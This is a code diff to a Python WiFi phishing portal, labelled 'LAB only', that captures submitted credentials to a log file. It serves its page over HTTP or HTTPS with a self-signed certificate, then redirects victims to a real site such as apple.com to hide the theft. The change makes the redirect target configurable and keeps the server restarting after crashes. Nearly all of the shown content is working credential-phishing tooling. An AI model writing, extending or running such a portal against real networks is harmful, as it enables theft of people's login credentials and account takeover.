@@ -12,7 +12,6 @@ CRED_LOG = "captured_creds.txt"
 STATS_LOG = "stats.log"
 HTTPS_CERT = "selfsigned.crt"
 HTTPS_KEY = "selfsigned.key"
-REDIRECT_URL = "https://apple.com/"  
 
 POST_COUNT = 0
 PER_IP = defaultdict(int)
@@ -47,11 +46,9 @@ class PhishHandler(SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(b"<html><body><h2>Error: Could not log credentials! Try again later.</h2></body></html>")
             return
-        # Redirect to legit site after POST
         self.send_response(302)
-        self.send_header('Location', REDIRECT_URL)
+        self.send_header('Location', self.server.redirect_url)
         self.end_headers()
-
     def log_message(self, *args): pass
 
 def check_root():
@@ -75,15 +72,18 @@ def gen_selfsigned_cert():
         Popen(cmd, stdout=PIPE, stderr=PIPE).communicate()
         print("[*] Created self-signed certs.")
 
-def run_server(port=80, use_https=False):
-    httpd = ThreadingHTTPServer(('', port), PhishHandler)
+def run_server(port=80, use_https=False, redirect_url="https://apple.com/"):
+    class HandlerWithRedirect(PhishHandler):
+        pass
+    httpd = ThreadingHTTPServer(('', port), HandlerWithRedirect)
+    httpd.redirect_url = redirect_url
     if use_https:
         gen_selfsigned_cert()
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(certfile=HTTPS_CERT, keyfile=HTTPS_KEY)
         httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
     proto = "https" if use_https else "http"
-    print(f"[*] Phishing portal server running on {proto}://0.0.0.0:{port}")
+    print(f"[*] Phishing portal server running on {proto}://0.0.0.0:{port} (redirect to {redirect_url})")
     try:
         httpd.serve_forever()
     except OSError as e:
@@ -106,6 +106,7 @@ def main():
     import time
     parser = argparse.ArgumentParser(description="WiFi phishing portal (LAB only)")
     parser.add_argument('--https', action="store_true", help="Serve on 443/HTTPS with self-signed cert.")
+    parser.add_argument('--redirect', type=str, default="https://apple.com/", help="Redirect after POST.")
     args = parser.parse_args()
 
     check_python3()
@@ -116,7 +117,7 @@ def main():
     print(f"[*] Starting phishing portal server on {proto} (port {port}).")
     while True:
         try:
-            run_server(port=port, use_https=args.https)
+            run_server(port=port, use_https=args.https, redirect_url=args.redirect)
         except Exception as crash:
             log_error(f"Server crashed: {crash}. Cooling down for 120 seconds...")
             print(f"[!] Server crashed! See {ERROR_LOG}. Retrying in 2 min...")
